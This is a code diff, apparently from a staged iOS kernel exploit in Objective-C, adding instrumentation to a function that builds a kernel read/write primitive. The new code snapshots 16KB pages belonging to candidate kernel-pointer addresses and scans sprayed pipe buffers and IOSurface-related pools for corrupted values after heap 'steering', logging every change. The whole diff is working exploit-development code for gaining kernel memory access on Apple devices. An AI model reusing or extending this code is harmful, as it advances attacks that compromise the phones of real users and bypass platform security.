@@ -3129,6 +3129,19 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
         }
 
         // Test mach_make_memory_entry_64 + vm_remap read/write alias on the first Stage 5 candidate page (if any)
+        // and snapshot all Stage 5 candidate 16KB pages before dynamic steering
+        uint8_t *candPageSnapBefore = (gStage5CandCount > 0) ? (uint8_t *)calloc((size_t)gStage5CandCount, 0x4000) : NULL;
+        BOOL candPageSnapValid[8] = {NO};
+        for (int ci = 0; ci < gStage5CandCount && ci < 8; ci++) {
+            vm_address_t cPage = gStage5Cands[ci].userVA & ~(vm_address_t)0x3fffULL;
+            vm_size_t rSz = 0;
+            if (candPageSnapBefore && cPage &&
+                vm_read_overwrite(mach_task_self(), cPage, 0x4000,
+                                  (vm_address_t)(candPageSnapBefore + ci * 0x4000), &rSz) == KERN_SUCCESS &&
+                rSz == 0x4000) {
+                candPageSnapValid[ci] = YES;
+            }
+        }
         if (gStage5CandCount > 0) {
             vm_address_t candPage = gStage5Cands[0].userVA & ~(vm_address_t)0x3fffULL;
             memory_object_size_t entrySz = 0x4000;
@@ -3369,6 +3382,19 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                             }
                         }
                     }
+                    uint64_t *pq = (uint64_t *)pbuf;
+                    size_t nq = (size_t)got / 8;
+                    for (size_t qi = 0; qi + 4 < nq && pipeMutations < 8; qi++) {
+                        size_t byteOff = qi * 8;
+                        size_t inPage = byteOff & 0xfffULL;
+                        if (inPage == 0x48 || inPage == 0x50 || inPage == 0xf0 || inPage == 0xf8 || inPage == 0x248 || inPage == 0x250) continue;
+                        if (pq[qi] != expectedPTag) {
+                            KPH9OutAppend(log, @"    pipeDelta[pipe=%d +0x%zx]: q0=0x%016llx q1=0x%016llx (expected 0x%016llx)\n",
+                                          p, byteOff, pq[qi], pq[qi + 1], expectedPTag);
+                            pipeMutations++;
+                            qi += 3;
+                        }
+                    }
                 }
                 free(pbuf);
             }
@@ -3377,9 +3403,10 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
         }
         if (pipeTile) free(pipeTile);
 
-        // Re-read all Stage 5 candidate userland VAs to detect any live value change
-        int vaDeltas = 0;
-        for (int ci = 0; ci < gStage5CandCount; ci++) {
+        // Re-read all Stage 5 candidate userland VAs and full 16KB pages to detect any live value change
+        int vaDeltas = 0, pageDeltas = 0;
+        uint8_t *candPageSnapAfter = (gStage5CandCount > 0) ? (uint8_t *)calloc(1, 0x4000) : NULL;
+        for (int ci = 0; ci < gStage5CandCount && ci < 8; ci++) {
             uint64_t curVal = 0;
             vm_size_t outSz = 0;
             if (vm_read_overwrite(mach_task_self(), gStage5Cands[ci].userVA, sizeof(uint64_t),
@@ -3390,9 +3417,29 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                                   ci, (unsigned long)gStage5Cands[ci].userVA, gStage5Cands[ci].kptr, curVal);
                 }
             }
+            vm_address_t cPage = gStage5Cands[ci].userVA & ~(vm_address_t)0x3fffULL;
+            vm_size_t rSz = 0;
+            if (candPageSnapValid[ci] && candPageSnapBefore && candPageSnapAfter &&
+                vm_read_overwrite(mach_task_self(), cPage, 0x4000,
+                                  (vm_address_t)candPageSnapAfter, &rSz) == KERN_SUCCESS &&
+                rSz == 0x4000) {
+                for (size_t bo = 0; bo + 8 <= 0x4000; bo += 8) {
+                    uint64_t wB = *(uint64_t *)(candPageSnapBefore + ci * 0x4000 + bo);
+                    uint64_t wA = *(uint64_t *)(candPageSnapAfter + bo);
+                    if (wB != wA) {
+                        pageDeltas++;
+                        if (pageDeltas <= 8) {
+                            KPH9OutAppend(log, @"    candPageDelta[%d page=0x%lx+0x%zx]: 0x%016llx -> 0x%016llx\n",
+                                          ci, (unsigned long)cPage, bo, wB, wA);
+                        }
+                    }
+                }
+            }
         }
-        KPH9OutAppend(log, @"  postSteerScan: sharedSurfPool=%lu surfMutations=%d pipesArmed=%d pipeMutations=%d stage5CandChecked=%d vaDeltas=%d\n",
-                      (unsigned long)sharedPools.count, surfMutations, h9PipesArmed, pipeMutations, gStage5CandCount, vaDeltas);
+        if (candPageSnapBefore) free(candPageSnapBefore);
+        if (candPageSnapAfter) free(candPageSnapAfter);
+        KPH9OutAppend(log, @"  postSteerScan: sharedSurfPool=%lu surfMutations=%d pipesArmed=%d pipeMutations=%d stage5CandChecked=%d vaDeltas=%d pageDeltas=%d\n",
+                      (unsigned long)sharedPools.count, surfMutations, h9PipesArmed, pipeMutations, gStage5CandCount, vaDeltas, pageDeltas);
     }
 
     CVPixelBufferRelease(px);
